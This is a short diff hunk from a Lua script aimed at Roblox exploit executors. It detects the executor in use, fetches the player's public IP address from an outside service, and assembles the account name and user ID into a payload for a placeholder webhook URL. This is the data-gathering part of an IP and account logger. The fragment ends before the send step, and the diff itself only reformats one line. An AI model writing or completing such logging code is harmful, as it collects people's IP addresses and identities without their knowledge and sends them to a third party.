@@ -24,8 +24,7 @@ local check =
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl"
 local UserIp = game:HttpGet("http://api.ipify.org")
-local url =
-   "webhookurl"
+local url = "webhookurl"
 local data = {
    ["content"] = "Account name: "..game.Players.LocalPlayer.Name.." Id: "..game.Players.LocalPlayer.UserId,
    ["embeds"] = {
